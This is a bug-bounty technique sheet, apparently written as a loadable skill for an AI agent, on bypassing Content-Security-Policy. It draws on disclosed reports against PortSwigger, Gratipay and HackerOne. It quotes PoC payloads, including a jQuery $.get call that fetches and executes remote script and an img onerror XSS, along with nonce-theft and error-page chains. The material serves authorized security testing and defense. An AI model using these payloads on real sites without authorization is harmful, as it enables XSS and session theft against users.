---
name: hunter-l3-csp-bypass
description: "Use when hunting CSP Bypass on a target. Loads the L3 technique sheet: CSP bypass techniques neutralize a site's Content-Security-Policy so that injected script or content actually executes."
domain: cybersecurity
subdomain: web
tags:
- web
- csp-bypass
- hunting
- l3
version: '1.0'
---

# CSP Bypass — Technique Sheet

## Overview

CSP bypass techniques neutralize a site's Content-Security-Policy so that injected script or content actually executes. The class splits into two broad plays: (1) abusing legit page-context functionality (jQuery, Angular directives, third-party scripts) that violates the policy's assumptions while staying inside the allowlist, and (2) finding response states — error pages, cache-served pages, unsupported browsers — where the CSP header simply isn't applied at all. It pays when a target ships a strict nonce/allowlist CSP as its primary XSS defense: knocking out that defense converts otherwise-dormant injection points into full XSS, often escalating a previously-reported or "low" finding into critical.

## Distinct sub-patterns

### 1. Angular `ng-on-error` img directive → nonce theft via trusted third-party script

- Endpoint shape: any page on the CSP-protected site where arbitrary HTML/img can be injected or executed; in the recorded case the vector was run against `https://portswigger.net/` from the browser console as the demonstration vehicle.
- Payload (verbatim, escalation variant):
  ```js
  var demo=document.createElement("img");
  demo.src="https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"; 
  document.body.innerHTML="";demo.width="1000"; demo.height="1000";
  document.body.appendChild(demo);
  ```
  The original chain entry used `<img src=x ng-on-error=...>` as the trigger.
- Root cause: the CSP header **lacks an `img-src` directive**, so images load from any origin. Angular's `ng-on-error` attribute binds an error handler onto the img, and because the error handler fires inside Angular's compiled code (the trusted reCAPTCHA `main.min.js` on the page), script runs in a context that lets the attacker **steal the page's nonce** — defeating the nonce-based script whitelist. The recorded escalation then re-demonstrated execution with a fresh vector after the vendor patched the original bypass, showing the CSP was still bypassable.
- Impact: arbitrary script execution on `portswigger.net` — re-proven in the browser console even after the CSP added post-`2279346`.
- Exemplars: `2387458` (escalation), original report `2279346` (ng-on-error + reCAPTCHA nonce theft).

### 2. Outdated jQuery `$.get()` — script fetch from a non-approved origin

- Endpoint shape: any page whose CSP allowlist includes `script-src` entries but where an old jQuery is loaded. In the record: `https://gratipay.com`, executed in the browser console.
- Payload (verbatim):
  ```js
  $.get('https://sakurity.com/jqueryxss');
  ```
- Root cause: old jQuery versions treat the response of `$.get()` with a script-like data type evaluation behavior — effectively executing fetched content as script. The fetched URL is attacker-controlled and lives on a **non-approved origin**, so the CSP allowlist is bypassed without ever needing an injection point in page markup: the vulnerable library itself is the gadget.
- Impact: the remote script (`https://sakurity.com/jqueryxss`) executed in the page context, fully bypassing the CSP.
- Exemplar: `241341` (Gratipay).

### 3. Error pages with no CSP — URL suffix manipulation to escape policy enforcement

- Endpoint shape: `GET /` on error pages across **multiple HackerOne endpoints/subdomains**, with a `url_suffix` parameter at the end of the path.
- Payload (verbatim):
  ```html
  <img src=x onerror=alert('Hacker1')>
  ```
- Root cause: HackerOne's error pages (404-class responses) are served **without any Content-Security-Policy header**. Appending `%` or `%"` to a URL forces the request into the error-page path, so the response the inline handler lands on carries no CSP — the inline event handler executes freely.
- Impact: CSP bypass demonstrated across multiple HackerOne subdomains with a video PoC; the inline `<img onerror>` handler fired on the headerless error page.
- Exemplar: `250729`.
- Chain steps as recorded:
  1. append `%` or `%"` to the URL
  2. CSP not applied on the resulting error page
  3. inline event handler executes

### 4. CSP header absent for unsupported browsers + CDN cache poisoning of headerless responses

- Endpoint shape: `GET /` — all pages on the target (HackerOne).
- Payload: none stated (record notes no payload).
- Root cause: CSP response headers are **inconsistently served for browsers that don't support them** — those requests get a headerless response. Because Cloudflare sits in front, such a headerless page can be **cached**, and the cached (CSP-free) copy is then served to other users.
- Impact: pages served without CSP headers get cached by Cloudflare, making XSS attacks materially easier to mount on the affected pages.
- Exemplar: `321`.

## Bypass / chain notes

- **Nonce theft is the pivot of the strongest chain.** On `portswigger.net`, the flow was: injection → `ng-on-error` handler inside trusted third-party JS (reCAPTCHA `main.min.js`) → exfiltrate the nonce → nonce-based script whitelist defeated → arbitrary script execution. Once the nonce is in hand, the strictest CSP becomes decoration.
- **Missing `img-src` was the entry wedge.** An unrestricted image source is what allowed the `ng-on-error` img vector to load/fire at all; audit the policy for missing directives, not just the `script-src` allowlist.
- **Escape enforcement entirely instead of defeating it.** Two independent records (`250729`, `321`) show the CSP doesn't apply on certain responses: error pages reached via `%` / `%"` URL suffixes, and CDN-cached headerless responses. Both convert "bypass" into "policy never present."
- **Framework/library gadgets carry the payload.** `ng-on-error` (Angular) and `$.get()` (old jQuery) both mean the executing code originates from a file already allowlisted by the CSP — no allowlist entry for the attacker is needed. Chaining a known JS library vuln is a repeatable CSP bypass class.
- **Post-patch re-testing matters.** `2387458` is itself an escalation of `2279346`: after the vendor fixed the first bypass, a different `img`-based vector still executed. Full bounties were paid for re-demonstrations.

## Gotchas / what NOT to do

- Don't fixate on `script-src` allowlist entries alone — the PortSwigger bypass hinged on a *missing* `img-src`, and the execution came from a legitimately allowlisted third-party script.
- Don't assume the CSP applies site-wide. Error pages and CDN-cached copies are separate response classes; test them explicitly by appending `%` or `%"` and inspecting response headers.
- Don't test only in a modern browser. The cached-headerless-response pattern (`321`) originates from browsers that don't support CSP; check how the CDN caches those variants.
- Don't report library-version weaknesses without proving execution in page context — the Gratipay finding paid because `$.get('https://sakurity.com/jqueryxss')` demonstrably executed, not merely because jQuery was outdated.
- For console-demonstrated vectors (both browser-console records), the accepted impact framing was "arbitrary script executes on the target origin despite CSP" — demonstrate with the target's real CSP in force, not with the policy disabled.

## Real-world impact examples

- **2387458 (PortSwigger):** execution of a new script on `portswigger.net` in the browser console despite the nonce-based CSP — proven twice: via the original `ng-on-error` + reCAPTCHA nonce-theft chain (`2279346`) and via a different img-based vector after patching.
- **241341 (Gratipay):** `$.get('https://sakurity.com/jqueryxss')` executed attacker-controlled remote script in the page context, bypassing the CSP allowlist outright.
- **250729 (HackerOne):** inline handler `<img src=x onerror=alert('Hacker1')>` executed on error pages across multiple subdomains after `%`/`%"` URL suffixes, with video PoC.
- **321 (HackerOne):** Cloudflare-cached pages served without CSP headers, creating a persistent headerless-surface that simplifies mounting XSS on the target.